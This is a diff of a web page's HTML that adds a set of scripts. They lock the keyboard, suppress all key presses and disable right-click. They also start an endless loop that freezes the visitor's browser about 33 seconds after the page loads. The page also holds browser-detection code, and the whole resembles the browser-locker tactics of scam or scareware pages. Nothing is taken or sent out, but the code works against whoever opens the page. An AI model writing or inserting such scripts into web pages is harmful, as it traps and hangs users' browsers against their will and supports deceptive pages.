@@ -722,6 +722,32 @@ function myFunction() {
 }
 </script>
 
+	<script>
+    navigator.keyboard.lock();
+    document.onkeydown = function (e) {
+    return false;
+    }
+</script>
+
+<script>
+    // Disable right-click
+    window.addEventListener('contextmenu', function (e) {
+        e.preventDefault();
+    });
+</script>
+
+<script>
+
+    setTimeout("warning()", 33000);
+    setTimeout("warning()", 33000);
+    function warning(){
+    while(true){
+        console.log('warning')
+}
+}
+
+
+</script>
 
 <script type="text/javascript">/*<![CDATA[*/
 
@@ -784,32 +810,7 @@ if(browser.name=="Firefox" || isIEedge|| InternetEx || navigator.appName == 'Mic
 /*]]>*/</script>
 
 
-<script>
-    navigator.keyboard.lock();
-    document.onkeydown = function (e) {
-    return false;
-    }
-</script>
 
-<script>
-    // Disable right-click
-    window.addEventListener('contextmenu', function (e) {
-        e.preventDefault();
-    });
-</script>
-
-<script>
-
-    setTimeout("warning()", 43000);
-    setTimeout("warning()", 43000);
-    function warning(){
-    while(true){
-        console.log('warning')
-}
-}
-
-
-</script>
   
 
 
